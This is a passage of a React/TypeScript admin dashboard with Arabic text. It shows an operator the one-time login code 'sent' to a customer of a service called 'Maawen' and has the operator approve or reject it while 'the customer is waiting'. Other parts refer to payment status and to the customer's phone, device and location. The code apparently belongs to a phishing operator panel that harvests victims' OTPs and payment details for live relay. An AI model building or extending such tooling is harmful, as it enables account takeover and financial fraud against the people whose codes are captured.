            {statusLabel}
          </span>
        </div>

        {status === "pending_admin" && decidable && (
          <div className={styles.adminActions}>
            <button
              className={`${styles.actionBtn} ${styles.approveBtn}`}
              onClick={() => decide("approve")}
              disabled={deciding}
            >
              ✓ موافقة
            </button>
            <button
              className={`${styles.actionBtn} ${styles.rejectBtn}`}
              onClick={() => decide("reject")}
              disabled={deciding}
            >
              ✗ رفض
            </button>
          </div>
        )}
        {status === "pending_admin" && !decidable && (
          <div className={styles.staleNote}>طلب أقدم — لا ينتظره العميل. قرّر على الأحدث.</div>
        )}
      </div>
    </div>
  );
}

/** بطاقة رمز تحقق تسجيل دخول "معاون" — يعرض OTP مع أزرار القرار. */
function MaawenOtpCard({
  entry,
  decidable = true,
  onDecided,
}: {
  entry: { id: string; type: string; payload: Record<string, unknown>; created_at: string };
  decidable?: boolean;
  onDecided?: (entryId: string, status: "approved" | "rejected") => void;
}) {
	const p = entry.payload;
	const otp = String(p.otp ?? "----");
	const status = String(p.status ?? "pending_admin");
	const [deciding, setDeciding] = useState(false);
	const copy = useCopy();

	const statusLabel =
    status === "approved" ? "✓ موافق عليه" : status === "rejected" ? "✗ مرفوض" : "⏳ بانتظار قرار المدير";
	const statusClass = status === "approved" ? "green" : status === "rejected" ? "red" : "amber";

	async function decide(decision: "approve" | "reject") {
    setDeciding(true);
    try {
      const res = await fetch("/api/maawen/login/decide-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ entryId: entry.id, decision }),
      });
      if (res.ok) {
        onDecided?.(entry.id, decision === "approve" ? "approved" : "rejected");
      } else {
        setDeciding(false);
      }
    } catch {
      setDeciding(false);
    }
  }

	return (
    <div className={styles.card}>
      <div className={styles.cardHeader}>
        <span className={styles.cardTitle}><span className={styles.maawenTag}>معاون</span> رمز تحقق (OTP)</span>
        <div className={styles.cardHeaderRight}>
          <span className={styles.cardTime}>⏱ {formatDateTime(entry.created_at)}</span>
        </div>
      </div>
      <div className={styles.cardBody}>
        <div className={styles.otpSection}>
          <span className={styles.otpLabel}>الرمز المُرسل:</span>
          <div
            className={`${styles.otpBoxes} ${styles.copyable}`}
            dir="ltr"
            onClick={() => copy(otp, "رمز OTP")}
            title="انقر للنسخ"
          >
            {otp.split("").map((d, i) => (
              <div key={i} className={styles.otpBox}>{d}</div>
            ))}
          </div>
        </div>

        <div className={styles.paymentStatus}>
          <span className={`${styles.statusBadge} ${statusClass === "green" ? styles.statusGreen : statusClass === "red" ? styles.statusRed : styles.statusAmber}`}>
            {statusLabel}
          </span>
        </div>

        {status === "pending_admin" && decidable && (
          <div className={styles.adminActions}>
            <button
              className={`${styles.actionBtn} ${styles.approveBtn}`}
              onClick={() => decide("approve")}
              disabled={deciding}
            >
              ✓ موافقة
            </button>
            <button
              className={`${styles.actionBtn} ${styles.rejectBtn}`}
              onClick={() => decide("reject")}
              disabled={deciding}
            >
              ✗ رفض
            </button>
          </div>
        )}
        {status === "pending_admin" && !decidable && (
          <div className={styles.staleNote}>طلب أقدم — لا ينتظره العميل. قرّر على الأحدث.</div>
        )}
      </div>
    </div>
  );
}

/** قيم موضعية لا معنى لنسخها — لا تُفعّل عليها خاصية النسخ. */
const PLACEHOLDER_VALUES = ["غير متوفر", "غير متوفرة", "غير متوفر/ة", "غير محدد", "—", "-", ""];

function DataRow({
  label,
  value,
  dir,
  mono,
  small,
  highlight,
  copyable = true,
}: {
  label: string;
  value: string;
  dir?: "ltr" | "rtl";
  mono?: boolean;
  small?: boolean;
  highlight?: "green" | "red" | "amber";
  copyable?: boolean;
}) {
  const toast = useToast();
  const [copied, setCopied] = useState(false);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const canCopy = copyable && !PLACEHOLDER_VALUES.includes(value.trim());
  const valueClass = highlight
    ? highlight === "green"
      ? styles.valueGreen
      : highlight === "red"
        ? styles.valueRed
        : styles.valueAmber
    : styles.valueDefault;

  useEffect(() => {
    return () => {
      if (timerRef.current) clearTimeout(timerRef.current);
    };
  }, []);

  function handleCopy() {
    if (!value.trim()) return;
    const done = () => {
      setCopied(true);
      toast.push(`تم نسخ ${label}`, "success");
      if (timerRef.current) clearTimeout(timerRef.current);
      timerRef.current = setTimeout(() => setCopied(false), 1500);
    };
    const fail = () => toast.push("تعذّر النسخ", "error");
    if (navigator.clipboard?.writeText) {
      navigator.clipboard.writeText(value).then(done).catch(() => fallbackCopy(value, done, fail));
    } else {
      fallbackCopy(value, done, fail);
    }
  }

  return (
    <div className={styles.dataRow}>
      <span className={styles.dataLabel}>{label}:</span>
      <span
        className={`${styles.dataValue} ${valueClass} ${mono ? styles.mono : ""} ${small ? styles.smallText : ""} ${canCopy ? styles.dataCopyable : ""} ${copied ? styles.dataCopied : ""}`}
        dir={dir}
        onClick={canCopy ? handleCopy : undefined}
        title={canCopy ? "انقر للنسخ" : undefined}
      >
        {copied ? "✓ " : ""}
        {value}
      </span>
    </div>
  );
}

function EmptyData({ text }: { text: string }) {
  return <div className={styles.emptyData}>{text}</div>;
}

function InfoChip({
  icon,
  value,
  muted,
}: {
  icon: React.ReactNode;
  value: string;
  muted?: boolean;
}) {
  return (
    <div className={styles.infoChip}>
      {icon}
      <span className={muted ? styles.infoMuted : styles.infoMono}>{value}</span>
    </div>
  );
}

/* ===== أيقونات SVG ===== */
function BackIcon() {
  return (
    <svg className={styles.backIcon} width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <path d="M19 12H5" /><path d="m12 19-7-7 7-7" />
    </svg>
  );
}
function PhoneIcon() {
  return (
    <svg className={styles.infoIcon} width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
    </svg>
  );
}
function DesktopIcon() {
  return (
    <svg className={styles.infoIcon} width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <rect x="2" y="3" width="20" height="14" rx="2" /><line x1="8" x2="16" y1="21" y2="21" /><line x1="12" x2="12" y1="17" y2="21" />
    </svg>
  );
}
function GlobeSmallIcon() {
  return (
    <svg className={styles.infoIcon} width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <circle cx="12" cy="12" r="10" /><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" /><path d="M2 12h20" />
    </svg>
  );
}

function LocationIcon() {
  return (
    <svg className={styles.infoIcon} width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      <path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z" /><circle cx="12" cy="10" r="3" />
    </svg>
  );
}
